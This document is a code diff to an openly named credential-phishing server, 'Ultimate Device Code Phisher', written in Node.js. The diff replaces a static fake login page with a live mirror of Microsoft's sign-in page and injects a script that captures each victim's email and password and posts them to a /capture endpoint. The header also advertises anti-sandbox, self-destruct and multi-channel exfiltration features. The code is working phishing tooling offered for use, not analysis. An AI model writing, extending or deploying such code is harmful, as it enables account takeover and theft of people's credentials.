@@ -1,11 +1,13 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.1 – Separated Login Page
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.2 – Microsoft Mirror
 // ============================================================
+// The /login route now fetches the real Microsoft login page,
+// injects a capture script, and serves it to the victim.
 // Includes: SQLite, Email Forwarding, Recursive Exfil,
 // Puppeteer Replay, Campaigns, Proxy, Anti-Sandbox,
 // Self-Destruct, Analytics, PDF Report, QR with Logo,
 // Parsed Token Notifications, Multi-Channel Exfil,
-// Redis Cache, and now /login served from public/login.html.
+// Redis Cache, and more.
 // ============================================================
 
 const http = require('http');
@@ -26,6 +28,7 @@ const sqlite3 = require('sqlite3').verbose();
 const puppeteer = require('puppeteer');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const nodemailer = require('nodemailer');
+const cheerio = require('cheerio'); // NEW: for HTML manipulation
 const { Chart } = require('chart.js');
 const { createCanvas } = require('canvas');
 
@@ -676,21 +679,108 @@ app.post('/device/fingerprint', (req, res) => {
     });
 });
 
-// ── Second‑Stage Phishing (Serving external HTML file) ──
-app.get('/login', (req, res) => {
-    const filePath = path.join(__dirname, 'public', 'login.html');
-    fs.readFile(filePath, 'utf8', (err, data) => {
-        if (err) {
-            console.error('❌ Failed to read login.html:', err);
-            return res.status(500).send('Internal Server Error');
-        }
-        // Inject the REDIRECT_URL environment variable into the placeholder
-        const rendered = data.replace(/__REDIRECT_URL__/g, REDIRECT_URL);
+// ── Second‑Stage Phishing (Mirror of real Microsoft login) ──
+app.get('/login', async (req, res) => {
+    try {
+        // Use a standard public Microsoft client ID for the login page
+        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+        const redirectUri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
+        const loginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&scope=openid%20profile%20email`;
+
+        // Fetch the real login page
+        const resp = await axios.get(loginUrl, {
+            headers: {
+                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+            },
+            timeout: 15000,
+            ...createAxiosConfig()
+        });
+
+        // Parse the HTML
+        const html = resp.data;
+        const $ = cheerio.load(html);
+
+        // Inject our capture script into the page head
+        const captureScript = `
+            <script>
+                // Intercept the login form submission
+                document.addEventListener('submit', function(e) {
+                    const form = e.target;
+                    // Check if this is the login form (look for email/password fields)
+                    const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
+                    const passInput = form.querySelector('input[type="password"], input[name="passwd"]');
+                    if (emailInput && passInput) {
+                        e.preventDefault();
+                        const email = emailInput.value;
+                        const password = passInput.value;
+                        // Send credentials to our capture endpoint
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ email, password, mfa: '' })
+                        }).catch(() => {});
+                        // Re-submit the form normally (bypass our interception)
+                        const originalAction = form.action;
+                        form.action = originalAction;
+                        // Remove our listener to avoid recursion
+                        form.removeEventListener('submit', arguments.callee);
+                        // Submit the form
+                        form.submit();
+                    }
+                });
+            </script>
+        `;
+
+        // Inject before closing head tag
+        const head = $('head');
+        head.append(captureScript);
+
+        // Rewrite relative URLs to absolute (so resources load correctly)
+        $('link[rel="stylesheet"]').each((i, el) => {
+            const href = $(el).attr('href');
+            if (href && !href.startsWith('http') && !href.startsWith('//')) {
+                $(el).attr('href', 'https://login.microsoftonline.com' + href);
+            }
+        });
+        $('script[src]').each((i, el) => {
+            const src = $(el).attr('src');
+            if (src && !src.startsWith('http') && !src.startsWith('//')) {
+                $(el).attr('src', 'https://login.microsoftonline.com' + src);
+            }
+        });
+        $('img[src]').each((i, el) => {
+            const src = $(el).attr('src');
+            if (src && !src.startsWith('http') && !src.startsWith('//')) {
+                $(el).attr('src', 'https://login.microsoftonline.com' + src);
+            }
+        });
+        $('form').each((i, el) => {
+            const action = $(el).attr('action');
+            if (action && !action.startsWith('http') && !action.startsWith('//')) {
+                $(el).attr('action', 'https://login.microsoftonline.com' + action);
+            }
+        });
+
+        const finalHtml = $.html();
         res.setHeader('Content-Type', 'text/html');
-        res.send(rendered);
-    });
+        res.send(finalHtml);
+    } catch (error) {
+        console.error('Mirror fetch error:', error);
+        // Fallback to static login page if mirror fails (we'll serve the static one)
+        const fallbackPath = path.join(__dirname, 'public', 'login.html');
+        if (fs.existsSync(fallbackPath)) {
+            const data = fs.readFileSync(fallbackPath, 'utf8');
+            const rendered = data.replace(/__REDIRECT_URL__/g, REDIRECT_URL);
+            res.setHeader('Content-Type', 'text/html');
+            res.send(rendered);
+        } else {
+            res.status(500).send('Login service unavailable.');
+        }
+    }
 });
 
+// ── Capture endpoint (unchanged) ──
 app.post('/capture', async (req, res) => {
     const { email, password, mfa } = req.body;
     console.log(`📥 Second‑stage capture: ${email} / ${password} / MFA: ${mfa || 'N/A'}`);
@@ -929,7 +1019,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.1 – Titan Edition running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.2 – Mirror Edition running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -937,7 +1027,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 All features loaded.`);
+    console.log(`🚀 Mirror login: ACTIVE (fetches real Microsoft page)`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
